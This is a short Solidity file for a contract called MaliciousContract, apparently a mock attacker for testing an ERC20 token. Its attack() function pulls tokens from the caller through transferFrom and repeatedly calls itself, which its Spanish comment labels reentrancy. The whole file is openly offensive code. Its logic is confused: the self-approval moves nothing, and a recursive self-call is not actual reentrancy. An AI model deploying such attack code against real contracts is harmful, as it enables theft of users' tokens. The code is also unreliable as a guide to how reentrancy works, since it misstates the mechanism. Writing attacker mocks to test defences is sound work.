// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousContract {
    IERC20 public token;
    uint256 public attackCount = 0;
    uint256 constant MAX_ATTACKS = 5;

    constructor(address _token) {
        token = IERC20(_token);
    }

    function attack(address recipient, uint256 amount) external {
        if(attackCount < MAX_ATTACKS) {
            attackCount++;
            token.approve(address(this), amount);
            (bool success,) = address(token).call(abi.encodeWithSignature("transferFrom(address,address,uint256)", msg.sender, recipient, amount));
            
            // Reentrancia
            if(success) {
                this.attack(recipient, amount); // Referenciar la instancia actual del contrato con `this`
            }
        }
    }
}